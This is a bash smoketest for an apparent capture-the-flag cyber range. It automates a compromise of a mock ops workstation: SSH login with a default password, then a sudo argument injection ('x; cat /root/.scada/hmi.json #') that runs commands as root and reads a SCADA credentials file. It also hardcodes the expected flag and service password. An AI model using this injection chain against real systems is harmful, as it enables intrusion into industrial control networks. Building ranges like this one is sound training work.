#!/usr/bin/env bash
# A15 Ops Engineer Workstation smoketest.
#
# Runs the full flag 37 compromise chain (SSH -> sudo arg injection ->
# read /root/.scada/hmi.json) from inside a14-kali, plus the downstream
# reachability check that A15 can talk to scada-gw for flags 18/19.
#
# Usage (from the range host):
#     docker cp smoketest.sh a14-kali:/tmp/a15-smoke.sh
#     docker exec a14-kali bash /tmp/a15-smoke.sh

set -u

HOST="${A15_HOST:-ops-eng01.boreas.local}"
USER_IVANOV="${A15_USER:-s.ivanov}"
PASS_IVANOV="${A15_PASS:-Welcome1}"

EXPECTED_FLAG_37="FLAG{5c3e7a9f1b8d4602}"
EXPECTED_SVC_SCADA_PW="Sc@da#2025!"

FAIL=0
pass() { echo "  [PASS] $1"; }
fail() { echo "  [FAIL] $1"; FAIL=1; }

echo "A15 smoketest - target=$HOST user=$USER_IVANOV"

echo
echo "--- Reachability (corporate-face: SSH + Ops Telemetry dashboard) ---"
code=$(curl -s -o /dev/null -w '%{http_code}' "http://$HOST/" --max-time 4)
[[ "$code" == "200" ]] && pass "Ops Telemetry dashboard served on :80" || fail "dashboard returned $code"

dash_body=$(curl -s "http://$HOST/" --max-time 4)
grep -q 'NV-3200' <<<"$dash_body" && pass "dashboard mentions NV-3200 generator" || fail "dashboard missing NV-3200"
grep -q 's.ivanov' <<<"$dash_body" && pass "dashboard footer breadcrumbs s.ivanov contact" || fail "dashboard missing ivanov contact"

# helper: run a command as s.ivanov over SSH and print output (incl. stderr)
ssh_ivanov() {
    sshpass -p "$PASS_IVANOV" ssh \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o BatchMode=no \
        "$USER_IVANOV@$HOST" "$1" 2>&1
}

echo
echo "--- Flag 37 step 1: SSH foothold as s.ivanov / Welcome1 ---"
whoami_out=$(ssh_ivanov "whoami")
# ssh emits 'Warning: Permanently added ...' to stderr on first connect,
# which we captured via 2>&1. Grep for the username instead of strict ==.
grep -qx "$USER_IVANOV" <<<"$whoami_out" && pass "SSH login succeeds" || fail "SSH login failed (got '$whoami_out')"

echo
echo "--- Flag 37 step 2: home dir breadcrumbs present ---"
history_out=$(ssh_ivanov "cat ~/.bash_history 2>/dev/null")
grep -q 'scada_diag' <<<"$history_out" && pass ".bash_history primes the sudo call" || fail ".bash_history missing scada_diag"
notes_out=$(ssh_ivanov "cat ~/notes.txt 2>/dev/null")
grep -q "hmi creds on root's side" <<<"$notes_out" && pass "notes.txt names the loot location" || fail "notes.txt missing"

echo
echo "--- Flag 37 step 3: sudo -l shows the single scada_diag rule ---"
sudo_list=$(ssh_ivanov "sudo -n -l 2>&1")
grep -q 'NOPASSWD.*scada_diag.sh' <<<"$sudo_list" && pass "sudo rule present" || fail "sudo rule missing: $sudo_list"

echo
echo "--- Flag 37 step 4: sudo-arg-injection yields root command exec ---"
# Injection payload uses a trailing '#' to comment out the rest of the
# curl argument (which otherwise glues to the injected command as
# ':8080/ping' and makes the shell try to run 'id:8080/ping' as a
# single command name).
id_out=$(ssh_ivanov 'sudo /opt/ops/scada_diag.sh --host "x; id #"')
grep -q 'uid=0(root)' <<<"$id_out" && pass "injection runs id as root" || fail "injection failed: $id_out"

echo
echo "--- Flag 37 step 5: read /root/.scada/hmi.json via injection ---"
hmi_out=$(ssh_ivanov 'sudo /opt/ops/scada_diag.sh --host "x; cat /root/.scada/hmi.json #"')
grep -qF "$EXPECTED_FLAG_37" <<<"$hmi_out" && pass "flag 37 present in hmi.json" || fail "flag 37 missing from injection output: $hmi_out"
grep -qF "$EXPECTED_SVC_SCADA_PW" <<<"$hmi_out" && pass "svc-scada password present in hmi.json" || fail "svc-scada cred missing"
grep -q 'svc-scada' <<<"$hmi_out" && pass "svc-scada username present in hmi.json" || fail "svc-scada username missing"

echo
echo "--- Downstream: from A15, HMI (tcp 8080) and Modbus (tcp 502) reachable ---"
reach_hmi=$(ssh_ivanov "python3 -c \"import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode())\" | head -10")
grep -q 'Generator Control System' <<<"$reach_hmi" && pass "A15 -> scada-gw:8080 HMI reachable" || fail "A15 -> scada-gw HMI failed: $reach_hmi"
reach_modbus=$(ssh_ivanov "python3 -c \"import socket; s=socket.socket(); s.settimeout(3); s.connect(('scada-gw.boreas.local', 502)); print('ok'); s.close()\"")
grep -q '^ok$' <<<"$reach_modbus" && pass "A15 -> scada-gw:502 Modbus TCP reachable" || fail "A15 -> Modbus TCP failed: $reach_modbus"
# verify pymodbus is importable (flag 19 depends on it)
pymodbus_check=$(ssh_ivanov "python3 -c \"from pymodbus.client import ModbusTcpClient; print('pymodbus ok')\"")
grep -q 'pymodbus ok' <<<"$pymodbus_check" && pass "pymodbus importable on A15" || fail "pymodbus import failed: $pymodbus_check"

echo
echo "--- Isolation: A15 cannot see lab or bunker-ot ---"
iso_lab=$(ssh_ivanov "python3 -c \"import socket; s = socket.socket(); s.settimeout(2); s.connect(('172.20.30.10', 22)); print('reach')\" 2>&1")
grep -q 'reach' <<<"$iso_lab" && fail "A15 can reach lab VLAN 30 (should not)" || pass "A15 -> lab unreachable (correct)"
iso_bunker=$(ssh_ivanov "python3 -c \"import socket; s = socket.socket(); s.settimeout(2); s.connect(('172.20.50.5', 22)); print('reach')\" 2>&1")
grep -q 'reach' <<<"$iso_bunker" && fail "A15 can reach bunker-ot (should not)" || pass "A15 -> bunker unreachable (correct)"

echo
if (( FAIL == 0 )); then
    echo "A15 smoketest: PASS"
    exit 0
else
    echo "A15 smoketest: FAIL ($FAIL failure(s))"
    exit 1
fi
